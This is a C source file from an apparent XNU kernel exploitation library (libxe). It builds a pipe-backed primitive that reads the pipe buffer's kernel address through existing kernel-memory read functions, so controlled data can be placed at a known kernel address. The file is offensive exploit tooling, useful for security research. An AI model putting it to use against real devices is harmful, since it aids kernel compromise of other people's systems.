//
//  pipe.c
//  libxe
//
//  Created by sreejith on 3/20/22.
//

#include <stdlib.h>

#include "util/pipe.h"
#include "util/assert.h"
#include "xnu/proc.h"
#include "memory/kmem.h"


struct xpl_pipe {
    int         read_fd;
    int         write_fd;
    uintptr_t   buffer;
    size_t      size;
    char*       reset_buffer;
};


#define MAX_BUFFER_SIZE (4 * 16384)


xpl_pipe_t xpl_pipe_create(size_t size) {
    xpl_assert_cond(size, <=, MAX_BUFFER_SIZE);
    
    int pfds[2];
    int res = pipe(pfds);
    xpl_assert_errno(res);
    
    /// Make pipe allocate a buffer with size larger than required size
    char* buffer = malloc(size);
    ssize_t wrote_bytes = write(pfds[1], buffer, size);
    xpl_assert_cond(wrote_bytes, ==, size);
    
    /// Reset write position to zero
    ssize_t read_bytes = read(pfds[0], buffer, size);
    xpl_assert_cond(read_bytes, ==, size);
    
    /// Read address of allocated buffer
    uintptr_t pipe_buffer;
    int error = xpl_xnu_proc_find_fd_data(xpl_xnu_proc_current_proc(), pfds[0], &pipe_buffer);
    xpl_assert_err(error);
    uintptr_t allocated_buffer = xpl_kmem_read_ptr(pipe_buffer, TYPE_PIPEBUF_MEM_BUFFER_OFFSET);
    xpl_assert_cond(xpl_kmem_read_uint32(pipe_buffer, TYPE_PIPEBUF_MEM_SIZE_OFFSET), >=, size);
    
    xpl_pipe_t pipe = malloc(sizeof(struct xpl_pipe));
    pipe->read_fd = pfds[0];
    pipe->write_fd = pfds[1];
    pipe->buffer = allocated_buffer;
    pipe->size = size;
    pipe->reset_buffer = buffer;
    
    return pipe;
}


uintptr_t xpl_pipe_get_address(xpl_pipe_t pipe) {
    return pipe->buffer;
}


void xpl_pipe_write(xpl_pipe_t pipe, const void* data, size_t size) {
    xpl_assert_cond(pipe->size, >=, size);
    ssize_t bytes_written = write(pipe->write_fd, data, size);
    xpl_assert_cond(bytes_written, ==, size);
    /// Reset write position to zero
    ssize_t bytes_read = read(pipe->read_fd, pipe->reset_buffer, size);
    xpl_assert_cond(bytes_read, ==, size);
}


void xpl_pipe_destroy(xpl_pipe_t* pipe_p) {
    xpl_pipe_t pipe = *pipe_p;
    close(pipe->read_fd);
    close(pipe->write_fd);
    free(pipe->reset_buffer);
    free(pipe);
    *pipe_p = NULL;
}
